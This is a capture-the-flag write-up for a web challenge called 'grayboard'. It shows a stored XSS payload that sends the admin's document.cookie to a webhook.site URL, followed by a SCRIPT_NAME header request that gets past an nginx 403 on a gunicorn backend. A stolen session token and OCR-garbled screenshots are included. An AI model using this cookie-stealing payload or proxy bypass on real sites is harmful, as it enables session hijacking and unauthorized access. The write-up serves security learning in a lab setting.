# grayboard
> My homework for my web design class is really bad but I don't know what to do. I really need to pass this class, can you help me?

## About the Challenge
We were given a website without the source code and there are some functionality such as:

* Login
* Register
* Submit a submissions


[Image extracted text: grayboard
Submit
Profile
Logout
Welcome to GrayBoard
Hello students!
Your web design homework is due by tomorrow! Please be sure to submit
your homework on time and
will personally grade it.
1
Dynamis
1
IHTML -
OU1LY"]


## How to Solve?
When you read the description on the homepage:

```
Your web design homework is due by tomorrow! Please be sure to submit your homework on time and I will personally grade it.
```

Additionally, if you use `CTRL + U` on any page of the website, you will find another endpoint inside an HTML comment:

```html
    <!-- <div class="text-center fixed-bottom">
        <footer class="text-center fixed-bottom">
            <small><a href="/internal">Internal</a></small>
        </footer>
    </div> -->
```


[Image extracted text: https:IIthecybercoopctf-grayboard chals iojinternal
Forbidden
You must be admin t0 access the internal area]


I'm sure this website is vulnerable to XSS. We need to steal the admin cookie and access the `/internal` endpoint after obtaining the admin cookie. So I submitted a XSS payload into a submission form


[Image extracted text: Submit
<script>
location. replace( "https: / /webhook. Site/55af7326-b996-4cca-99c5-c7fc3c3a7f83/2"+document. cookie)
</script>
Submit]



[Image extracted text: sec-ch-ua-platform
"Linux"
sec-ch-ua-mobile
70
sec-ch-ua
"Chromium" ; V="1
host
webhook. site
content-length
content-type
Query strings
Form values
session
eyJpZCI6MSwidHlwZSI6ImFkbWluliwidXNlcmShbWUiOiJhzGlpbijg.ZYEGZ
(empty)
g.d1bDdPTTZeGho8wcXOFOtNZOHWE
Files
No content]


Wait for a while and we got the cookie! Now, we can login as an admin


[Image extracted text: Request
Response
Pretty
Raw
Hex
In
=
Pretty
Raw
Hex
Render
In
=
GET
linternal
HTTP/1.1
HTTP/1.1
302
FOUND
Host:
thecybercoopctf-grayboard. chals. io
2
Date:
Tue
19
Dec
2023
03:04:59
GMT
3
Cookie:
session=
3 Content-Type:
text/html;
charset-utf-8
eyJpZCI6MSwidHlwZSI6ImFkbWluliwidXNlcmShbWUioiJhZGlpbijg
ZYEGZW.N
Content-Length:
249
pm8_EdpYTSBSQnWOejvMaiWSgA
5
Connection:
close
User-Agent
Mozilla/5.0
Windows
NT
10.0;
Win64;
X64)
6
Server:
gunicorn/20 .0.4
AppleWebKit/537.36
(KHTML,
like Gecko)
Chrome/ 120,
0.6099.71
Location:
Safari/537
36
http: //thecybercoopctf-grayboard. chals
io/ internal/submissions
Accept:
Cookie
text/html,application/xhtml+xml
application/xml;q-0.9,image/avif_
image/webp, image/apng,*/*;q-0.8,application/ signed-exchange
V=b3;
10
<!DOCTYPE
HTML
PUBLIC
"-I/W3C/ /DTD
HTML
3.2
Final/ /EN" >
q=0 _
11
<title>
Referer:
https:
/thecybercoopctf-grayboard. chals
io/profile
Redirecting
Accept-Encoding
gzip,
deflate,
br
</title>
Accept-Language
en-US, en;q-0.9
12
<hl>
Priority:
u=0
Redirecting
10
Connection:
close
</hl>
11
13
<p>
12
You
should
be
redirected automatically
to
target
URL:
<a
href="
[internal/submissions">
linternal/submissions
~la>
If
not
click
the
link.
Vary:]



[Image extracted text: Request
Response
Pretty
Raw
Hex
In
Pretty
Raw
Hex
Render
In
FET
internal/submissions
HTTP/1.1
HTTP/1.1
403
Forbidden
2
Host:
thecybercoopctf-grayboard. chals
io
2
Server:
nginx/1.14.2
User-Agent:
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
3
Date:
Tue ,
19
Dec
2023
03:05:37
GMT
AppleWebKit
537
36
(KHTML ,
like
Gecko)
Chrome/120.0.6099.71
Content-Type
text/html
Safari/537
36
5
Connection:
close
Accept:
6
Content-Length:
571
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif ,
image/webp, image/apng
*/*;q-0.8,application/ signed-exchange;v=b3;
<html>
q=0 _
<head>
5 Accept-Encoding
gzip,
deflate,
br
<title>
Accept-Language
en-US, en;q-0.9
403
Forbidden
Connection:
close
</title>
Referer:
http://thecybercoopctf-grayboard. chals
io/
</head>
10
<body
bgcolor="white">
10
11
<centerz
<hl>
403
Forbidden
</hl>
</center>
12
<hrz
<centerz
nginx/1.14.2
</center>
13
</body>
14
/html>
15
padding
to
disable
MSIE
and
Chrome
friendly
error
page
16
padding
to
disable
MSIE
and
Chrome friendly
error
page
5T>
17
padding
to
disable
MSIE
and
Chrome friendly
error
page
5T>
18
padding
to
disable
MSIE
and
Chrome friendly
error
page
~~>
19
padding
to
disable
MSIE
and
Chrome friendly
error
page
~~>
20
padding
to
disable
MSIE
and
Chrome friendly
error
page
17>
21]


> Because this part is a little bit guessy so I will skipped some explanation here.

It appears that accessing the `/internal*` endpoint will result in a 403 Forbidden error. Since this website uses `gunicorn` and `nginx`, I found this [writeup](https://ctf.zeyu2001.com/2021/csaw-ctf-qualification-round-2021/gatekeeping). We can bypass it using `SCRIPT_NAME`, so the final payload will look like this

```
GET /test/internal/submissions HTTP/1.1
Host: thecybercoopctf-grayboard.chals.io
Cookie: session=eyJpZCI6MSwidHlwZSI6ImFkbWluIiwidXNlcm5hbWUiOiJhZG1pbiJ9.ZYEGzw.Npm8_EdpYT5BSQnWOejvMaiW5gA
Upgrade-Insecure-Requests: 1
SCRIPT_NAME: /test
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
51
In
=
Pretty
Raw
Hex
Render
GET
Itest/internal/submissions HTTP/1.1
HTTP/1.1
200
OK
2
Host:
thecybercoopctf-grayboard. chals.io
2
Date:
Tue
19
Dec
2023
03:11:22
GMT
Cookie:
session=
3 Content-Type:
text/html;
charset-utf-8
eyJpZCI6MSwidHlwZSI6ImFkbWluliwidXNlcmShbWUioiJhZGlpbiJg
ZYEGZW.N
Content-Length:
49
pm8_EdpYTSBSQnWOejvMaiWSgA
5
Connection:
keep-alive
Upgrade-Insecure-Requests:
6
Server:
gunicorn/20 .0.4
5 SCRIPT_NAME
Itest
Vary:
Cookie
6
8
flag{why_yes_i_am_valedictorian_but_dont_ask_how}]


```
flag{why_yes_i_am_valedictorian_but_dont_ask_how}
```